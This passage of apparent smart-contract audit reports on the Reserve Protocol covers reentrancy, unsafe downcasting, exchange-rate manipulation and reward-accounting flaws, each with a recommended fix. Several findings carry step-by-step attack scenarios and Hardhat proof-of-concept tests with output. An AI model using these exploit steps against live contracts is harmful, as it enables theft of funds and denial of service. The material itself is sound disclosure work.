withdraw each with about `charge/2` amount of RToken in each block and stole other users funds when protocol is under collaterlized.  ** scenario #2: attacker can call `BackingManager.manageTokens()` for reentrancy call: 1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1. 2. BackingManager has 200K `SOME_ERC777` balance and 150K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block. 3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers. 4. attacker would call `redeem()` to redeem 30K RToken and code would updated `basketsNeeded` to 120K and burn 30K RToken and code would calculated withdrawal amounts as 30K `SOME_ERC777` tokens and 30K `USDT` tokens for withdraws. 5. then contract would transfer 30K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 120K and total RTokens is 120K and BackingManager balance is 170K `SOME_ERC777` and 150K `USDT` (`USDT` is not yet transferred). then attacker contract can call `BackingManager.manageTokens()`. 6. function `manageTokens()` would calculated baskets can held by BackingManager and it would be higher than 150K and `basketsNeeded` would be 130K and code would consider 60K `SOME_ERC777` and 30K `USDT` tokens as revenue and try to distribute it between RSR stakers and RToken holders. code would mint 30K RTokens and would distribute it. 7. then attacker hook function would return and `redeem()` would transfer 30K `USDT` to attacker address in rest of the execution. 8. so attacker would able to make code to calculate RToken holders backed tokens as revenue and distribute it between RSR stakers and RSR stakers would receive RTokens backed tokens as rewards. the attack is more effective is battery charge is high but in general case attacker can call redeem for battery charge amount and cause those funds to be counted and get distributed to the RSR stakers (according to the rewards distribution rate)  ## Tools Used VIM  ## Recommended Mitigation Steps prevent reading reentrancy attack by central reentrancy guard or by one main proxy interface contract that has reentrancy guard. or create contract state (similar to basket nonce) which changes after each interaction and check for contracts states change during the call. (start and end of the call) 
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L230-L243   # Vulnerability details  ## Unsafe downcasting in `issue(...)` can be exploited to cause permanent DoS  #### Important note! I first found this bug in `issue(...)` at first, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to **replace all occurences** of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.  ### Details The `amtRToken` is a user supplied parameter in the `issue(uint256 amtRToken)` function ```sol uint192 amtBaskets = uint192(  totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken ); ``` The calculated amount is unsafely downcasted into `uint192`.  This means that if the resulting calculation is a multiple of $2^{192}$, `amtBaskets = 0`  The code proceeds to the following line, where `erc20s` and `deposits` arrays will be empty since we are asking for a quote for 0. (see `quote(...)` in `BasketHandler.sol` where amounts are multiplied by zero) ```sol (address[] memory erc20s, uint256[] memory deposits) = basketHandler.quote(             amtBaskets,             CEIL         ); ``` This means an attacker can call `issue(...)` with a very high `amtRToken` amount that is a multiple of $2^{192}$, without depositing any amount of collateral.  The DoS issues arises because `whenFinished(uint256 amtRToken)` is dependent on `amtRToken`. With such a high value, `allVestAt` will be set so far in the future that it causes a permanent DoS. i.e. Issuances will never vest. ```sol uint192 vestingEnd = whenFinished(amtRToken); // D18{block number} ```  ### Proof of Concept This PoC demonstrates that an attacker can call `issue(...)` without collateral tokens to modify `allVestAt` variable to an extreme value, such that all further issuances cannot be vested for all users.  Do note that the PoC is done with `totalSupply() == 0` case, so we supply `amtRToken` as a multiple of $2^{192}$. Even if there is an existing `totalSupply()`, we just need to calculate a value for `amtRToken >= 2^192` such that $\frac{\text{basketsNeeded} \times \text{amtRToken}}{totalSupply()} = 0$. This attack does not require `totalSupply()` be zero.  ```sol uint192 amtBaskets = uint192(  totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken ); ```  The `amount`, `baskets` and `quantities` values are also messed up, but it would not matter anyways...  Under 'Issuance and Slow Minting' tests in `RToken.test.ts`: ```sol it('Audit: DoS by downcasting', async function () {       const issueAmount: BigNumber = BigNumber.from(2n ** 192n)        // Set basket       await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])       await basketHandler.connect(owner).refreshBasket()        // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens       // This will cause allVestAt to be veryyyyy high, permanent DoS       const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)       const receipt = await tx.wait()       console.log(receipt.events[0].args)          await token0.connect(addr2).approve(rToken.address, initialBal)       const tx2 = await rToken.connect(addr2)['issue(uint256)'](initialBal)       const receipt2 = await tx2.wait()       console.log(receipt2.events[0].args)        // one eternity later...       await advanceTime('123456789123456789')       // and still not ready       await expect(rToken.connect(addr2).vest(addr2.address, 1))         .to.be.revertedWith("issuance not ready")      }) ``` Run with: ```bash yarn test:p1 --grep "Audit: DoS" ``` Expect to see (only important parts shown): ```bash [   ...   recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',   index: BigNumber { value: "0" },   amount: BigNumber { value: "6277101735386680763835789423207666416102355444464034512896" },   baskets: BigNumber { value: "0" },   erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],   quantities: [ BigNumber { value: "0" } ],   blockAvailableAt: BigNumber { value: "627710173538668076383578942320766744610235544446403452" } ] [   ...   recipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',   index: BigNumber { value: "0" },   amount: BigNumber { value: "6300000000000000000000000000000000000000000000000000000000" },   baskets: BigNumber { value: "22898264613319236164210576792333583897644555535965487104" },   erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],   quantities: [     BigNumber { value: "22898264613319236164210576792333583897644555535965487104" }   ],   blockAvailableAt: BigNumber { value: "1257710173538668076383578942320766744610235544446403452" } ]    RTokenP1 contract     Issuance and Slow Minting        Audit: DoS by downcasting ```  ### Impact Permanent DoS would be High risk considering RToken is an asset-backed **currency**. _A currency that is unable to issue new currency does not work as a currency_  Also, I believe existing collateral cannot be redeemed due to the extreme values also used in `redeem(...)` function. No PoC written due to time constriant for this case... but above should be enough impact.  Many other downcasting issues for this project. But using a safe casting library would prevent all the issues... not going to write multiple reports for same underlying issue.  ### Recommendations Use some safe casting library. OpenZeppelin's library does not have safe casting for `uint192` type. May have to find another or write your own.
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L121-L165   # Vulnerability details  ## Impact  Adversary can maliciously disable cToken collateral to cause loss to rToken during restructuring  ## Proof of Concept      if (referencePrice < prevReferencePrice) {         markStatus(CollateralStatus.DISABLED);     }  CTokenNonFiatCollateral and CTokenFiatCollateral both use the default refresh behavior presented in FiatCollateral which has the above lines which automatically disables the collateral if the reference price ever decreases. This makes the assumption that cToken exchange rates never decrease but this is an incorrect assumption and can be exploited by an attacker to maliciously disable a cToken being used as collateral.  [CToken.sol](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L480-L505)          uint redeemTokens;         uint redeemAmount;         /* If redeemTokensIn > 0: */         if (redeemTokensIn > 0) {             /*              * We calculate the exchange rate and the amount of underlying to be redeemed:              *  redeemTokens = redeemTokensIn              *  redeemAmount = redeemTokensIn x exchangeRateCurrent              */             redeemTokens = redeemTokensIn;             redeemAmount = mul_ScalarTruncate(exchangeRate, redeemTokensIn);         } else {             /*              * We get the current exchange rate and calculate the amount to be redeemed:              *  redeemTokens = redeemAmountIn / exchangeRate              *  redeemAmount = redeemAmountIn              */              // @audit redeemTokens rounds in favor of the user              redeemTokens = div_(redeemAmountIn, exchangeRate);             redeemAmount = redeemAmountIn;         }  The exchange rate can be manipulated by a tiny amount during the redeem process. The focus above is the scenario where the user requests a specific amount of underlying. When calculating the number of cTokens to redeem for a specific amount of underlying it rounds IN FAVOR of the user. This allows the user to redeem more underlying than the exchange rate would otherwise imply. Because the user can redeem *slightly* more than intended they can create a scenario in which the exchange rate actually drops after they redeem. This is because compound calculates the exchange rate dynamically using the current supply of cTokens and the assets under management.  [CToken.sol](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L293-L312)      function exchangeRateStoredInternal() virtual internal view returns (uint) {         uint _totalSupply = totalSupply;         if (_totalSupply == 0) {             /*              * If there are no tokens minted:              *  exchangeRate = initialExchangeRate              */             return initialExchangeRateMantissa;         } else {             /*              * Otherwise:              *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply              */             uint totalCash = getCashPrior();             uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;             uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;               return exchangeRate;         }     }  The exchangeRate when _totalSupply != 0 is basically:      exchangeRate = netAssets * 1e18 / totalSupply  Using this formula for we can now walk through an example of how this can be exploited  Example:  cTokens always start at a whole token ratio of 50:1 so let's assume this ratio to begin with. Let's use values similar to the current supply of cETH which is ~15M cETH and ~300k ETH. We'll start by calculating the current ratio:      exchangeRate = 300_000 * 1e18 * 1e18 / 15_000_000 * 1e8 = 2e26   Now to exploit the ratio we request to redeem 99e8 redeemAmount which we can use to calculate the amount of tokens we need to burn:      redeemAmount = 99e8 * 1e18 / 2e26 = 1.98 -> 1  After truncation the amount burned is only 1. Now we can recalculate our ratio:      exchangeRate = ((300_000 * 1e18 * 1e18) - 99e8) / ((15_000_000 * 1e8) - 1) = 199999999999999933333333333  The ratio has now been slightly decreased. In CTokenFiatCollateral the exchange rate is truncated to 18 dp so:      (referencePrice < prevReferencePrice) -> (19999999999999993 <  2e18) == true   This results in that the collateral is now disabled. This forces the vault to liquidate their holdings to convert to a backup asset. This will almost certainly incur losses to the protocol that were maliciously inflicted.  The path to exploit is relatively straightforward:  `refresh()` cToken collateral to store current rate -> Manipulate compound rate via redemption -> `refresh()` cToken collateral to disable  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Since the issue is with the underlying compound contracts, nothing can make the attack impossible but it can be made sufficiently difficult. The simplest deterrent would be to implement a rate error value (i.e. 100) so that the exchange rate has to drop more than that before the token is disabled. The recommended value for this is a bit more complicated to unpack. The amount that the exchange rate changes heavily depends on the number of cTokens minted. The larger the amount the less it changes. Additionally a malicious user can make consecutive redemptions to lower the rate even further. Using an error rate of 1e12 would make it nearly impossible for this to be exploited while still being very sensitive to real (and concerning) changes in exchange rate.      -   if (referencePrice < prevReferencePrice) {     +   if (referencePrice < prevReferencePrice - rateError) {             markStatus(CollateralStatus.DISABLED);         }
# Lines of code   https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L820-L832   # Vulnerability details   In `StRSR.sol`, `_payoutRewards` is used to accrue the value of rewards based on the time that has passed since `payoutLastPaid`  Because of it's dependence on `totalStakes`, `stakeRate` and time, the function is rightfully called on every `stake` and `unstake`.  There is a specific instance, in which `_payoutRewards` should also be called, which could create either an unfair reward stream or a governance attack and that's when `setRewardPeriod` and `setRewardRatio` are called.  If you imagine the ratio at which rewards are paid out as a line, then you can see that by changing `rewardRatio` and `period` you're changing it's slope.  You should then agree, that while governance can *rightfully* change those settings, it should `_payoutRewards` first, to ensure that the slope of rewards changes only for rewards to be distributed after the setting has changed.  ## Mitigation Functions that change the slope or period size should accrue rewards up to that point.  This is to avoid: - Incorrect reward distribution - Change (positive or negative) of rewards from the past  Without accrual, the change will apply retroactively from `payoutLastPaid`  Which could: - Change the period length prematurely - Start a new period inadvertently - Cause a gain or loss of yield to stakers  Instead of starting a new period  ## Suggested refactoring  ```solidity function setRewardPeriod(uint48 val) public governance {     require(val > 0 && val <= MAX_REWARD_PERIOD, "invalid rewardPeriod");     _payoutRewards(); // @audit Payout rewards for fairness     emit RewardPeriodSet(rewardPeriod, val);     rewardPeriod = val;     require(rewardPeriod * 2 <= unstakingDelay, "unstakingDelay/rewardPeriod incompatible"); }  function setRewardRatio(uint192 val) public governance {     require(val <= MAX_REWARD_RATIO, "invalid rewardRatio");     _payoutRewards(); // @audit Payout rewards for fairness     emit RewardRatioSet(rewardRatio, val);     rewardRatio = val; } ```
# Lines of code  https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179   # Vulnerability details  ## Impact The `BackingManager.handoutExcessAssets` function sends all `rsr` that the `BackingManager` holds to the `rsrTrader` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179)).    The purpose of this is that `rsr` which can be held by the `BackingManager` due to seizure from the `StRSR` contract is sent back entirely to the `StRSR` contract and not - as would happen later in the function ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242)) - shared across `rsrTrader` and `rTokenTrader`.    The `rsrTrader` then sends the `rsr` to the `Distributor` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65)).    So far so good. However the `Distributor` does not necessarily send all of the `rsr` to the `StRSR` contract. Instead it distributes the `rsr` according to its distribution table. I.e. there can be multiple destinations each receiving a share of the `rsr` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136)).    In economic terms, `rsr` that is thereby not sent to `StRSR` but to other destinations, is a transfer of funds from stakers to these destinations, i.e. a loss to stakers.    Stakers should only pay for recollateralization of the `RToken`, not however send revenue to `rsr` revenue destinations.    ## Proof of Concept Assume the following situation:    * A seizure of `rsr` from the `StRSR` contract occurred because the `RToken` was under-collateralized.    * A trade occurred which restored collateralization. However not all `rsr` was sold by the trade and was returned to the `BackingManager`.    Now `BackingManager.manageTokens` is called which due to the full collateralization calls `BackingManager.handoutExcessAssets` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118)).    This sends `rsr` to the `rsrTrader` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179)).    Then the `rsr` is sent to the `Distributor` ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65)).    There it is distributed across all `rsr` destinations ([https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136](https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136)).    ## Tools Used VSCode  ## Recommended Mitigation Steps `rsr` should be sent from the `BackingManager` directly to `StRSR` without the need to go through `rsrTrader` and `Distributor`. Thereby it won't be sent to other `rsr` revenue destinations.    Fix:    ``` diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol index 431e0796..eb506004 100644 --- a/contracts/p1/BackingManager.sol +++ b/contracts/p1/BackingManager.sol @@ -173,7 +173,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {          if (rsr.balanceOf(address(this)) > 0) {              // For CEI, this is an interaction "within our system" even though RSR is already live              IERC20Upgradeable(address(rsr)).safeTransfer( -                address(rsrTrader), +                address(stRSR),                  rsr.balanceOf(address(this))              );          } ```  There is a caveat to this however:    It is possible for `rsr` to be a reward token for a collateral of the `RToken`.   Neither the current implementation nor the proposed fix addresses this and instead sends the rewards to `StRSR`.    In principal, `rsr` that was rewarded should have a share that goes to the `rTokenTrader` as well as include all `rsr` revenue destinations.   However there is no easy way to differentiate where the `rsr` came from.    Therefore I think it is reasonable to send all `rsr` to `StRSR` and make it clear to developers and users that `rsr` rewards cannot be paid out to `rToken` holders.   
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87   # Vulnerability details  ## Impact  Asset plugins assume underlying collateral tokens will always behave as they are expected at the time of the plugin creation. This assumption can be incorrect because of multiple reasons such as upgrades/rug pulls/hacks.  In case a single collateral token in a basket of assets causes functions in the asset to fail the whole RToken functionality will be broken. This includes (and not limited to): 1. Users cannot redeem RTokens for any collateral 2. Users cannot issue RTokens 3. Bad collateral token cannot be unregistered 4. Stakers will not be able to unstake 5. Recollateralization will not be possible 6. Basket cannot be updated  The impacts become permanent as the unregistering of bad collateral assets is also dependent on collateral token behavior.  Emphasis of funds lost: A basket holds 2 collateral assets [cAssetA, cAssetB] where cAssetA holds 1% of the RToken collateral and cAssetB holds 99%. cAssetA gets hacked and self-destructed. This means it will revert on any interaction with it.  Even though 99% of funds still exists in cAssetB. They will be permanently locked and RToken will be unusable   ## Proof of Concept  Lets assume a `CTokenFiatCollateral` of `cUSDP` is registered as an asset in `AssetRegistry`. One day, `cUSDP` deployer gets hacked and the contract self-destructs, therefore any call to the `cUSDP` contract will fail.  `cUSDP` is a proxy contract: https://etherscan.io/address/0x041171993284df560249B57358F931D9eB7b925D#readProxyContract  Note: There could be other reasons that calls to `cUSDP` will revert such as:  1. Upgrade to implementation to change/deprecate functions 2. Freezing of contract for a long duration of time (due to patching) 3. blacklisting/whitelisitng callers.   ### Bad collateral assets cannot be unregistered  Lets describe the flow of unregistering an asset from the `AssetRegistry`: `governance` needs to call `unregister` in order to unregister and asset: https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87 ```     function unregister(IAsset asset) external governance {         require(_erc20s.contains(address(asset.erc20())), "no asset to unregister");         require(assets[asset.erc20()] == asset, "asset not found");         uint192 quantity = basketHandler.quantity(asset.erc20());          _erc20s.remove(address(asset.erc20()));         assets[asset.erc20()] = IAsset(address(0));         emit AssetUnregistered(asset.erc20(), asset);          if (quantity > 0) basketHandler.disableBasket();     } ```  As can seen above, `basketHandler.quantity(asset.erc20());` is called as part of the unregister flow. `quantity` function in `basketHandler`: https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300 ```     function quantity(IERC20 erc20) public view returns (uint192) {         try assetRegistry.toColl(erc20) returns (ICollateral coll) {             if (coll.status() == CollateralStatus.DISABLED) return FIX_ZERO;              uint192 refPerTok = coll.refPerTok(); // {ref/tok}             if (refPerTok > 0) {                 // {tok/BU} = {ref/BU} / {ref/tok}                 return basket.refAmts[erc20].div(refPerTok, CEIL);             } else {                 return FIX_MAX;             }         } catch {             return FIX_ZERO;         }     } ```  The asset is still registered so the `try` call will succeed and `coll.refPerTok(); ` will be called.  `refPerTok` function in `CTokenFiatCollateral` (which is used as an asset of `cUSDP`): https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45 ```     function refPerTok() public view override returns (uint192) {         uint256 rate = ICToken(address(erc20)).exchangeRateStored();         int8 shiftLeft = 8 - int8(referenceERC20Decimals) - 18;         return shiftl_toFix(rate, shiftLeft);     } ```  if `ICToken(address(erc20)).exchangeRateStored();` will revert because of the previously defined reasons (hack, upgrade, etc..), the whole `unregister` call will be a reverted.  ### Explaination of impact  As long as the asset is registered and cannot be removed (explained above), many function calls will revert and cause the impacts in the `impact` section.  The main reason is the `refresh` function of `CTokenFiatCollateral` (used for `cUSDP`) depends on a call to `cUSDP` `exchangeRateCurrent` function.  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37 ```     function refresh() public virtual override {         // == Refresh ==         // Update the Compound Protocol         ICToken(address(erc20)).exchangeRateCurrent();          // Intentional and correct for the super call to be last!         super.refresh(); // already handles all necessary default checks     } ```    `AssetRegistry`s `refresh` function calls refresh to all registered assets: https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50 ```     function refresh() public {         // It's a waste of gas to require notPausedOrFrozen because assets can be updated directly         uint256 length = _erc20s.length();         for (uint256 i = 0; i < length; ++i) {             assets[IERC20(_erc20s.at(i))].refresh();         }     } ```  In our case, `CTokenFiatCollateral.refresh()` will revert therefore the call to `AssetRegistry.refresh()` will revert.  `AssetRegistry.refresh()` is called in critical functions that will revert: 1. `_manageTokens` - used manage backing policy, handout excess assets and perform recollateralization (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L107) 2. `refreshBucket` - used to switch the basket configuration (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L184) 3. `issue` - used to issue RTokens to depositors (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L194) 4. `vest` - used to vest issuance of an account (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L380) 5. `redeem` - used to redeem collateral assets for RTokens (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L443) 6. `poke` - in main, used as a refresher (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Main.sol#L45) 7. `withdraw` in RSR, stakers will not be able to unstake (https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L302)  ## Tools Used  Foundry, VS Code  ## Recommended Mitigation Steps  For plugins to function as intended there has to be a dependency on protocol specific function. In a case that the collateral token is corrupted, the governance should be able to replace to corrupted token. The unregistering flow should never be depended on the token functionality.  
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202   # Vulnerability details    ## Impact The `BackingManager.manageTokens()` function checks if there's any deficit in collateral, in case there is, if there's a surplus from another collateral token it trades it to cover the deficit, otherwise it goes for a 'haircut' and cuts the amount of basket 'needed' (i.e. the number of baskets RToken claims to hold). In order to determine how much deficit/surplus there is the protocol calculates the 'basket range', where the top range is the optimistic estimation of the number of baskets the token would hold after trading and the bottom range is a pessimistic estimation.  The estimation is done by dividing the total collateral value by the price of 1  basket unit (for optimistic estimation the max value is divided by min price of basket-unit and vice versa). The problem is that this estimation is inefficient, for cases where just a little bit of collateral is missing the range 'band' (range.top - range.bottom) would be about 4% (when oracle error deviation is 1%) instead of less than 1%.  This can cause the protocol an unnecessary haircut of a few percent where the deficit can be solved by simple trading.  This would also cause the price of `RTokenAsset` to deviate more than necessary before the haircut.   ## Proof of Concept In the following PoC, the basket changed so that it has 99% of the required collateral for 3 tokens and 95% for the 4th. The basket range should be 980.03% (the basket has 95% collateral + 4% of 3/4 tokens. That 4% is worth 30.03% if we account for oracle error of their prices), but in reality the protocol calculates it as ~97.92%. That range causes the protocol to avoid trading and go to an unnecessary haircut to ~95%   ```diff diff --git a/contracts/plugins/assets/RTokenAsset.sol b/contracts/plugins/assets/RTokenAsset.sol index 62223442..03d3c3f4 100644 --- a/contracts/plugins/assets/RTokenAsset.sol +++ b/contracts/plugins/assets/RTokenAsset.sol @@ -123,7 +123,7 @@ contract RTokenAsset is IAsset {      // ==== Private ====        function basketRange() -        private +        public          view          returns (RecollateralizationLibP1.BasketRange memory range)      { diff --git a/test/Recollateralization.test.ts b/test/Recollateralization.test.ts index 3c53fa30..386c0673 100644 --- a/test/Recollateralization.test.ts +++ b/test/Recollateralization.test.ts @@ -234,7 +234,42 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {          // Issue rTokens          await rToken.connect(addr1)['issue(uint256)'](issueAmount)        }) +      it('PoC basket range', async () => { +        let range = await rTokenAsset.basketRange(); +        let basketTokens = await basketHandler.basketTokens(); +        console.log({range}, {basketTokens}); +        // Change the basket so that current balance would be 99 or 95 percent of +        // the new basket +        let q99PercentLess = 0.25 / 0.99; +        let q95ercentLess = 0.25 / 0.95; +        await basketHandler.connect(owner).setPrimeBasket(basketTokens, [fp(q99PercentLess),fp(q99PercentLess), fp(q95ercentLess), fp(q99PercentLess)]) +        await expect(basketHandler.connect(owner).refreshBasket()) +        .to.emit(basketHandler, 'BasketSet') + +        expect(await basketHandler.status()).to.equal(CollateralStatus.SOUND) +        expect(await basketHandler.fullyCollateralized()).to.equal(false) + +        range = await rTokenAsset.basketRange(); + +        // show the basket range is 95.9 to 99.9 +        console.log({range});   +        let needed = await rToken.basketsNeeded(); + +        // show that prices are more or less the same +        let prices = await Promise.all( basket.map(x => x.price())); + +        // Protocol would do a haircut even though it can easily do a trade +        await backingManager.manageTokens([]); + +        // show how many baskets are left after the haircut +         needed = await rToken.basketsNeeded(); +          +        console.log({prices, needed}); +        return; +     +      }) +      return;        it('Should select backup config correctly - Single backup token', async () => {          // Register Collateral          await assetRegistry.connect(owner).register(backupCollateral1.address) @@ -602,7 +637,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {          expect(quotes).to.eql([initialQuotes[0], initialQuotes[1], initialQuotes[3], bn('0.25e18')])        })      }) - +    return;      context('With multiple targets', function () {        let issueAmount: BigNumber        let newEURCollateral: FiatCollateral @@ -785,7 +820,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {        })      })    }) - +  return;    describe('Recollateralization', function () {      context('With very simple Basket - Single stablecoin', function () {        let issueAmount: BigNumber  ```  Output (comments are added by me):  ``` {   range: [     top: BigNumber { value: "99947916501440267201" },  //  99.9 basket units     bottom: BigNumber { value: "95969983506382791000" } // 95.9 basket units   ] } {   prices: [     [       BigNumber { value: "990000000000000000" },       BigNumber { value: "1010000000000000000" }     ],     [       BigNumber { value: "990000000000000000" },       BigNumber { value: "1010000000000000000" }     ],     [       BigNumber { value: "990000000000000000" },       BigNumber { value: "1010000000000000000" }     ],     [       BigNumber { value: "19800000000000000" },       BigNumber { value: "20200000000000000" }     ]   ],   needed: BigNumber { value: "94999999905000000094" } // basket units after haircut: 94.9 } ```  ## Recommended Mitigation Steps Change the formula so that we first calculate the 'base' (i.e. the min amount of baskets the RToken can satisfy without trading): ``` base = basketsHeldBy(backingManager) // in the PoC's case it'd be 95 (diffLowValue, diffHighValue) = (0,0)  for each collateral token:     diff = collateralBalance - basketHandler.quantity(base)      (diffLowValue, diffHighValue) = diff * (priceLow, priceHigh) addBasketsLow = diffLowValue / basketPriceHigh addBasketHigh = diffHighValue / basketPriceLow range.top = base + addBasketHigh range.bottom = base + addBasketLow ```
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L803 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L791   # Vulnerability details  ### Vulnerability Details  In `StRSR.sol` the `_domainSeparatorV4` is calculated using the EIP-721 standard, which uses the `name` and `version` that are passed in the init at the function call `__EIP712_init(name, "1");`  Now, governance can change this `name` anytime using the following function:  ```solidity function setName(string calldata name_) external governance {         name = name_;     } ```  After that call the domain seperator would still be calculated using the old name, which shouldnt be the case.   ### Impact  The permit transactions and vote delegation would be reverted if the domain seperator is wrong.   ### Recommendation  While changing the name in in setName function. update the domain seperator.
